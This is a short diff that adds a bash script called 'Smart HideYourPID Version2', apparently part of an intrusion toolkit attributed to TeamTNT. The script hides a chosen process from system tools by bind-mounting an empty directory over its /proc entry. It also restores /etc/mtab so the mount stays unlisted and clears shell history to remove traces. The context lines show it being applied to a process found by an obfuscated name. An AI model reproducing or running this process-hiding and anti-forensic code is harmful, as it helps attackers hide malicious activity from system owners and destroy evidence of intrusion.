@@ -3,3 +3,22 @@ SCOPE_PID=`ps ax | grep -v grep | grep abyofigfefda6c3itn9f3zkrmjfays31 | awk '{
 echo $SCOPE_PID > /usr/bin/hid.sc.op.e
 hid $SCOPE_PID
 }
+
+
+
+base1:
+
+#!/bin/bash
+#
+# Smart HideYourPID Version2
+# (c) 2019 hilde@teamtnt.red
+#
+if [ -z "$1" ]; then
+echo "no PID set!"; history -c 2>/dev/null 1>/dev/null; exit 2>/dev/null 1>/dev/null
+else
+if [ ! -e /usr/foo ]; then mkdir /usr/foo -p 2>/dev/null 1>/dev/null; fi
+cp /etc/mtab /usr/t 2>/dev/null 1>/dev/null
+mount --bind /usr/foo /proc/$1 2>/dev/null 1>/dev/null
+mv /usr/t /etc/mtab 2>/dev/null 1>/dev/null
+fi
+history -c 2>/dev/null 1>/dev/null
